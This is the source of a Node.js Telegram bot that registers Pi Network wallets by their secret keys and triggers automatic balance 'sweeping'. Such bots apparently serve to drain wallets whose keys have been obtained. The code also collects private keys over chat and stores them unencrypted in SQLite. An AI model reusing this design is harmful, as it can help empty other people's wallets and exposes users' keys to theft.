/**
 * Telegram Bot Controller & Server for Ultimate Multi-Wallet Hyper-Sweeper
 */

const TelegramBot = require('node-telegram-bot-api');
const Database = require('better-sqlite3');
const { startMonitor } = require('./monitor');
const { checkAndSweepWallet } = require('./sweeper');

const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const HORIZON_URL = process.env.PI_HORIZON_URL || 'https://api.mainnet.minepi.com';

if (!TOKEN) {
  console.error('ERROR: TELEGRAM_BOT_TOKEN is missing in environment variables.');
  process.exit(1);
}

const bot = new TelegramBot(TOKEN, { polling: true });
const db = new Database('wallets.db');

// Initialize Database Table
db.prepare(`
  CREATE TABLE IF NOT EXISTS wallets (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    chat_id TEXT,
    public_key TEXT UNIQUE,
    secret_key TEXT,
    sweep_count INTEGER DEFAULT 0,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  )
`).run();

console.log('[Database] Wallet storage initialized successfully.');

// Start 24/7 Real-Time Monitoring & Sweeping Engine
startMonitor({ db, bot, horizonUrl: HORIZON_URL });

// Telegram Bot Commands
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 
    `⚡ **Ultimate Multi-Wallet Hyper-Sweeper Active**\n\n` +
    `/add <PUBLIC_G_ADDRESS> <SECRET_S_KEY> — Register a wallet box for instant sweeping\n` +
    `/status — View all active individual wallet boxes, balances, and sweep counts\n` +
    `/remove <ID> — Stop monitoring and remove a specific wallet box\n` +
    `/help — Show commands`,
    { parse_mode: 'Markdown' }
  );
});

bot.onText(/\/help/, (msg) => {
  bot.sendMessage(msg.chat.id, 
    `📖 **Commands Guide:**\n\n` +
    `/add <G...> <S...> - Add wallet box\n` +
    `/status - Check balances and sweeps\n` +
    `/remove <ID> - Delete wallet box`,
    { parse_mode: 'Markdown' }
  );
});

bot.onText(/\/add (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const parts = match[1].trim().split(/\s+/);

  if (parts.length < 2) {
    return bot.sendMessage(chatId, '❌ Invalid format. Use: `/add <PUBLIC_G_ADDRESS> <SECRET_S_KEY>`', { parse_mode: 'Markdown' });
  }

  const publicKey = parts[0];
  const secretKey = parts[1];

  try {
    const stmt = db.prepare('INSERT INTO wallets (chat_id, public_key, secret_key) VALUES (?, ?, ?)');
    const info = stmt.run(String(chatId), publicKey, secretKey);

    bot.sendMessage(chatId, 
      `✅ **New Wallet Box Created! (Box #${info.lastInsertRowid})**\n` +
      `🔑 Address: \`${publicKey}\`\n` +
      `📦 Status: Active in real-time stream. Monitoring instantly for deposits and lockups!`,
      { parse_mode: 'Markdown' }
    );

    // Immediately check and sweep any existing balance upon adding
    const newWallet = db.prepare('SELECT * FROM wallets WHERE id = ?').get(info.lastInsertRowid);
    if (newWallet) {
      await checkAndSweepWallet(newWallet, HORIZON_URL, db, bot);
    }
  } catch (error) {
    if (error.message.includes('UNIQUE constraint failed')) {
      bot.sendMessage(chatId, '⚠️ This wallet address is already registered in the system.');
    } else {
      bot.sendMessage(chatId, `❌ Error adding wallet: ${error.message}`);
    }
  }
});

bot.onText(/\/status/, async (msg) => {
  const chatId = msg.chat.id;
  const wallets = db.prepare('SELECT * FROM wallets WHERE chat_id = ?').all(String(chatId));

  if (wallets.length === 0) {
    return bot.sendMessage(chatId, '📭 You have no active wallet boxes registered. Use `/add` to register one.', { parse_mode: 'Markdown' });
  }

  let response = `📊 **Active Wallet Boxes (${wallets.length})**\n\n`;
  const StellarSdk = require('@stellar/stellar-sdk');
  const server = new StellarSdk.Horizon.Server(HORIZON_URL);

  for (const w of wallets) {
    let currentBalance = 'Unknown';
    try {
      const acc = await server.loadAccount(w.public_key);
      const native = acc.balances.find(b => b.asset_type === 'native');
      if (native) currentBalance = `${native.balance} Pi`;
    } catch (e) {
      currentBalance = 'Unfunded / Error';
    }

    response += `📦 **Wallet Box #${w.id}**\n` +
                `├ 🔑 Address: \`${w.public_key}\`\n` +
                `├ 💰 Current Balance: \`${currentBalance}\`\n` +
                `├ ⚡ Total Sweeps Executed: \`${w.sweep_count}\`\n` +
                `└ 🕒 Last Inspected: \`${new Date().toLocaleTimeString()}\`\n\n`;
  }

  bot.sendMessage(chatId, response, { parse_mode: 'Markdown' });
});

bot.onText(/\/remove (\d+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const id = match[1];

  const result = db.prepare('DELETE FROM wallets WHERE id = ? AND chat_id = ?').run(id, String(chatId));

  if (result.changes > 0) {
    bot.sendMessage(chatId, `🗑️ Wallet Box #${id} has been successfully removed and stopped.`);
  } else {
    bot.sendMessage(chatId, `❌ Wallet Box #${id} not found or unauthorized.`);
  }
});

console.log('[Server] Telegram Bot server running and listening for commands.');
